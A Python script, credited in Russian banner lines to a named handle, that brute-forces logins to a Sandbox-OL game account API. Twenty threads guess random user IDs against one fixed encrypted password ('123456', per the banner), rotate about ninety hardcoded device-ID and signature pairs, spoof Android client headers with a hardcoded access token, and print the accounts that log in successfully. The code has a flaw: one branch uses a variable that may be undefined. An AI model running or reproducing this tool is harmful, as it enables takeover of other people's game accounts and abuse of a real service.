import requests
import random
import threading
import math
print('Создатель скрипта: @Nevotix000')
print('Аккаунты с паролем 123456')
print('Статус: "Быстро"')
print()
url = 'http://mods.sandboxol.com/user/api/v2/app/login'

credentials = [
    'b425edc7aa3297cb:F3QZaAO/kv4GLnjrbm6xa2GnBTBGa7G+Z6GrYGw3C+Q=',
    'ab395d7f7a1b2d42:HLLBtLe8r1civvQR05wGjmGnBTBGa7G+Z6GrYGw3C+Q=',
    '943f823bdf8fc146:54MUM7VZLM/9yhfkcuW8VGGnBTBGa7G+Z6GrYGw3C+Q=',
    '5286254463186d7d:p+SQZskMTY1PWSwQYacsMmGnBTBGa7G+Z6GrYGw3C+Q=',
    '9413af2e93d1f03d:Opg+Bd/7Tn+zVntBxULQNWGnBTBGa7G+Z6GrYGw3C+Q=',
    '2ee95bc39fbec1fd:29SgVI8uaukDA8NqSOn/zWGnBTBGa7G+Z6GrYGw3C+Q=',
    'aaab643e8217de57:zCwnyrOodWWVcXOT2jN3oWGnBTBGa7G+Z6GrYGw3C+Q=',
    '6fe7c9886621d198:z0Rj0155vmGsr2urX4Qq02GnBTBGa7G+Z6GrYGw3C+Q=',
    'f4528fefc77d8f68:QbbTVYVD8Pa9VXI7uv6Iy2GnBTBGa7G+Z6GrYGw3C+Q=',
    '03398581e4eb4a16:4z7kx4pWsLvQSFDGTpHAa2GnBTBGa7G+Z6GrYGw3C+Q=',
    '79bef29f55a7d26c:9s9zv70m6zuvtaT+jsfgqmGnBTBGa7G+Z6GrYGw3C+Q=',
    '8d78cb4accc736d1:apAGgqvVjeyVYo5Fibe8DmGnBTBGa7G+Z6GrYGw3C+Q=',
    'd996d74db2893c9d:BEDQKTY2/eN09CXrVqk3FGGnBTBGa7G+Z6GrYGw3C+Q=',
    '648d3867f12d9278:uGd9Q+ekmhcQnEGK006YW2GnBTBGa7G+Z6GrYGw3C+Q=',
    '8f49af293fd62646:E/qGgNDkUMwUgZrbIBGEeWGnBTBGa7G+Z6GrYGw3C+Q=',
    '6570aa2ab91e1bcc:IXH44ydwcV6rdcSUxmNGxWGnBTBGa7G+Z6GrYGw3C+Q=',
    'b736d6aa399826dc:HiaEQgW0kWpnj5A28wgmX2GnBTBGa7G+Z6GrYGw3C+Q=',
    'f46da3753adaf528:Y4Awvg8FiFTVa3B51NP/HmGnBTBGa7G+Z6GrYGw3C+Q=',
    'be44ea8241adc6bd:i3Kdo/UMJ6zyEJROeFjxjWGnBTBGa7G+Z6GrYGw3C+Q=',
    '4a10845cafd10221:u52FJIFK6mF4USzhVmMUs2GnBTBGa7G+Z6GrYGw3C+Q=',
    '724966f2f3436012:/nWoEYFRTGsBtI2U9fdOoGGnBTBGa7G+Z6GrYGw3C+Q=',
    '6f3c85dedd3436d4:uX1dPsbbyvcNn42dF9D5wWGnBTBGa7G+Z6GrYGw3C+Q=',
    '6975009485a396b6:0/Q/2eq5Kyi3zQfFkGTUiGGnBTBGa7G+Z6GrYGw3C+Q=',
    'b26d5951f30c1800:MkeXVF8nlDBRGbUDsle0r2GnBTBGa7G+Z6GrYGw3C+Q=',
    '7c9780b3a63c0d2b:BL5nU5u9Mj/R+C3vAhjew2GnBTBGa7G+Z6GrYGw3C+Q=',
    '31062b02c572fc10:XZe8z+Du7QP7K/WuGFMbI2GnBTBGa7G+Z6GrYGw3C+Q=',
    'd4c1b7f04dab0c7b:3ojaChuawYbsjM6SF+awEGGnBTBGa7G+Z6GrYGw3C+Q=',
    'c93561eabd05424c:qZ+yPgioYEpS9o/rirNW82GnBTBGa7G+Z6GrYGw3C+Q=',
    '2e4c29522f396f97:CW5+ZkSKg7DyGKKZ2UThW2GnBTBGa7G+Z6GrYGw3C+Q=',
    '68c1c442e1857388:rZKpquScXkIupPUST5QDl2GnBTBGa7G+Z6GrYGw3C+Q=',
    '44bccb07fa6cd9ad:B4huCBFmNL3yEcM+F0QEemGnBTBGa7G+Z6GrYGw3C+Q=',
    '5c993c84d285ab27:Pylmp5z71Chb5B57TKGqDmGnBTBGa7G+Z6GrYGw3C+Q=',
    'db7c56c9835ea145:86iwgENGlbFqDN2lFysHGGGnBTBGa7G+Z6GrYGw3C+Q=',
    'fa7f488ab42d5430:L+aCa+8j0odmsAoOwB4MaWGnBTBGa7G+Z6GrYGw3C+Q=',
    '875d14c47c584af3:az907PnLmzSuqR4kEkp3gmGnBTBGa7G+Z6GrYGw3C+Q=',
    '385e32e68320543a:uJmOi8xIx3cffz9/fz4e52GnBTBGa7G+Z6GrYGw3C+Q=',
    'f237945b0a619730:qb0PfIgSGLZ/aB6dU8/IwGGnBTBGa7G+Z6GrYGw3C+Q=',
    'd8cbd75d94e2b219:bC0eIxoP1G+IBr0qK2AHYGGnBTBGa7G+Z6GrYGw3C+Q=',
    'd5d8009306a9fb65:dCgyI92ZkSBRKacXeaSvFWGnBTBGa7G+Z6GrYGw3C+Q=',
    '4d67529d1e23c760:BLbkRpjKgzjE1mik9pHuF2GnBTBGa7G+Z6GrYGw3C+Q=',
    '74f711715023822c:T5zgwTDfnckCptmgiVwhMWGnBTBGa7G+Z6GrYGw3C+Q=',
    '4d28de59cd5492f2:jo7ogzQyUSd9O3ubf1aldmGnBTBGa7G+Z6GrYGw3C+Q=',
    'b86ec982acabf830:0buFVhcpyTrqUs074MS4mGGnBTBGa7G+Z6GrYGw3C+Q=',
    '7ca703552af746a5:XjtBnBF3LUeFqOdEfm7iemGnBTBGa7G+Z6GrYGw3C+Q=',
    'b110768fc593c1be:+FR5sU13JqATpb5dA4WFV2GnBTBGa7G+Z6GrYGw3C+Q=',
    'eeae71f9b5797868:UJLnl+ZUxEwRyCiZW4CazGGnBTBGa7G+Z6GrYGw3C+Q=',
    '927795f0c707b4af:Yw8BTLFW1i/8JYwHIGw2vWGnBTBGa7G+Z6GrYGw3C+Q=',
    'a94224123fc454c7:9tzJ5kFjHL4AEjcZlvJ0uGGnBTBGa7G+Z6GrYGw3C+Q=',
    'bf4db24e296f9d89:9IwfX+jv0zDMFrUfYiGJAGGnBTBGa7G+Z6GrYGw3C+Q=',
    '84371fe89335d3d8:Fo9D28kNfK+3FhwJ6Asb5WGnBTBGa7G+Z6GrYGw3C+Q=',
    '35da7c1331325574:1bWH3yP9Vo/IGbZeC8+pmGGnBTBGa7G+Z6GrYGw3C+Q=',
    'a2f71e60c82a4583:GRUkz9LvH8DS+BK0d53MgmGnBTBGa7G+Z6GrYGw3C+Q=',
    '9623d37046af80e9:Gr0CpfZd9hKeD8mK/9E/C2GnBTBGa7G+Z6GrYGw3C+Q=',
    '4cbbc2c47e04b0b6:zlX4noJAMOIcZc/VNOSmX2GnBTBGa7G+Z6GrYGw3C+Q=',
    '4952b1b01e19dc2b:cQySpY2fJrogQ4Gh08LOJmGnBTBGa7G+Z6GrYGw3C+Q=',
    '5997abb188dd80d6:1dookyp8K7n7I9Dc6NAQnmGnBTBGa7G+Z6GrYGw3C+Q=',
    'bc25a9875fbe1d6d:9RJ8ibW1HdAWLn5G/pMFGmGnBTBGa7G+Z6GrYGw3C+Q=',
    '0829a93b059b69e2:6tSNgtia6f+rMVmiZ8zE8GGnBTBGa7G+Z6GrYGw3C+Q=',
    '24adc966e91d8260:0W2zK2wcRt0r1fpyQOwXVGGnBTBGa7G+Z6GrYGw3C+Q=',
    'ecd2cf68307af4b4:eTMwYpKxvc7Bo4plMCUBSmGnBTBGa7G+Z6GrYGw3C+Q=',
    '4ea1820cd430b305:3CYFJPsrUxjLY8nsP7f77GGnBTBGa7G+Z6GrYGw3C+Q=',
    'b1cb2f3399bb649f:IDsRzyBVv7V0YnAYbGXniGGnBTBGa7G+Z6GrYGw3C+Q=',
    'c3c8e0d054428d45:V4/DtU3Sydt5mszZ+e2TcmGnBTBGa7G+Z6GrYGw3C+Q=',
    '699e6edf04543e01:WML8Hz/5bAOyY4FbeC4xdWGnBTBGa7G+Z6GrYGw3C+Q=',
    'b26a741ea74264f5:Op/ewMgALjfuw2q4N1NB0mGnBTBGa7G+Z6GrYGw3C+Q=',
    '64e343c37232a628:ESufUKSocIkHOKXiS7FiL2GnBTBGa7G+Z6GrYGw3C+Q=',
    '3c76a62fc67e7cc8:uu+uw61q9kIEWd7ZGZLT82GnBTBGa7G+Z6GrYGw3C+Q=',
    '9103b98b156eebbd:5S0zLUSo+pZaq2ErBSHqX2GnBTBGa7G+Z6GrYGw3C+Q=',
    '1a8e85f17345af71:aSYrxjDpxbnpJ7fL19m8nGGnBTBGa7G+Z6GrYGw3C+Q=',
    '2537c396febcb7d3:uZLiUtMyK0a8ehazUquO3mGnBTBGa7G+Z6GrYGw3C+Q=',
    '87ae70d87176bb51:Trbd1HscV1LuGSIjD07LpGGnBTBGa7G+Z6GrYGw3C+Q=',
    '815f361786d59fe5:MUff5jeoYOLf8/qaRG++HGGnBTBGa7G+Z6GrYGw3C+Q=',
    '9d8324e71d8ac80c:ukdnj1CL6IQq/MmA6DLjNGGnBTBGa7G+Z6GrYGw3C+Q=',
    'e9f8e769d6c20a51:kCnHx9MB1acEldiJYtEkbGGnBTBGa7G+Z6GrYGw3C+Q=',
    'f4f6bee574b06d99:ySq3voCratPUjA1unPGzmmGnBTBGa7G+Z6GrYGw3C+Q=',
    'bb80dbdb95e15601:MaFNcnLoRWT0l7/oWhVMdGGnBTBGa7G+Z6GrYGw3C+Q=',
    '84fc717745c84643:wPK2adO3NcrdpGjU4tTw02GnBTBGa7G+Z6GrYGw3C+Q=',
    '83b16b644e9a1a65:wsL6wkG/SzxWPXYenfXEp2GnBTBGa7G+Z6GrYGw3C+Q=',
    '0d2a9d32a9aec1f9:iUh5IYySpMo3SJQbpxvrm2GnBTBGa7G+Z6GrYGw3C+Q=',
    '32c3fbf2b5a3c7f6:X7e/GzmTkC0Wdtx86PVRVGGnBTBGa7G+Z6GrYGw3C+Q=',
    'a6aabdab4e86062f:D8ag/v6ddzXHRHtlo2KQuGGnBTBGa7G+Z6GrYGw3C+Q=',
    '547fa1ac374e5805:XKHNvdyW5g8X7Oulk26X5WGnBTBGa7G+Z6GrYGw3C+Q=',
    '019e56320cc5169c:aHFpgJTZGflnwYkeFQjHOmGnBTBGa7G+Z6GrYGw3C+Q=',
    '4b8998bc313bcb7a:Glxy6zpC0vnRGeJ6yISRwGGnBTBGa7G+Z6GrYGw3C+Q=',
    '9a48e16cbda74f45:oXWHBO8RjjEJjPDayiZZG2GnBTBGa7G+Z6GrYGw3C+Q=',
    '2b60eced0dd99906:jaSjQGnUwrh4aMejpg2jUWGnBTBGa7G+Z6GrYGw3C+Q=',
    '8f43847b1c58d8e9:HexSmKe/4ro0gmdPgzibDGGnBTBGa7G+Z6GrYGw3C+Q=',
    'd8d930f145368f5a:q1yzjyq4C1vyoN0GVaU5sGGnBTBGa7G+Z6GrYGw3C+Q=',
    '78f611e962dbe814:8Nk/qYgOHwO1nV/xkyzzNWGnBTBGa7G+Z6GrYGw3C+Q=',
    '2732f47a14fbf3d2:EexmTlJK2GbQLxgMhSPv12GnBTBGa7G+Z6GrYGw3C+Q=',
    'd65546485b23264b:yNXirhTXonG3YRWHJSow1GGnBTBGa7G+Z6GrYGw3C+Q=',
]

credentials_queue = credentials.copy()

def login():
    global credentials_queue
    used_uids = set()
    while True:
        if not credentials_queue:
            credentials_queue = credentials.copy()

        bmg_device_id, bmg_sign = credentials_queue.pop(0).split(':')

        uid = str(random.randint(10000000, 999999999))
        uid = str(math.ceil(int(uid) / 16) * 16)
        while uid in used_uids:
            uid = str(random.randint(10000000, 999999999))
            uid = str(math.ceil(int(uid) / 16) * 16)
        used_uids.add(uid)

        data = {
            'appType': 'android',
            'deviceId': 'Android:M22J20SG',
            'hasPassword': True,
            'imei': 'acbc2052-9a61-4d13-b7d1-7af4ad5ccfc5',
            'needReward': 0,
            'os': '11',
            'password': 'gWRioSiWAx5dKP2MNVbKztWoCri2L3fNzvYrMFUZRcx/U/zSrudSLpHU/xan+emK7s3sDw4/AKmagn9WTBArnLIDOpSjhdOPpJU5RSkoNXJrQh4sY75XjZXZvnU18z5YS1M9i4+ZXBVay866jb+qYbybJNvA4jGLGSa1koYLVaQ=',
            'uid': uid
        }

        headers = {
            'bmg-device-id': bmg_device_id,
            'bmg-sign': bmg_sign,
            'userId': uid,
            'Access-Token': 'eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI1MjM4NDYzNTIiLCJpYXQiOjE2ODk2MjY3NDEsInS1mwdqNHybES_7ZB4nQ',
            'packageName': 'amosCraft',
            'androidVersion': '30',
            'OS': 'android',
            'appVersion': '4018',
            'Content-Type': 'application/json; charset=UTF-8',
            'Accept-Encoding': 'gzip',
            'User-Agent': 'okhttp/3.12.1'
        }

        response = requests.post(url, headers=headers, json=data)

        if response.status_code == 200:
            response_json = response.json()
            if response_json.get('code') in [1029, 1]:
                print(response_json)
        elif response_json.get('code') in [8, 103, 108]:
            pass

threads = []
for i in range(20):
    t = threading.Thread(target=login)
    threads.append(t)
    t.start()

for thread in threads:
    thread.join()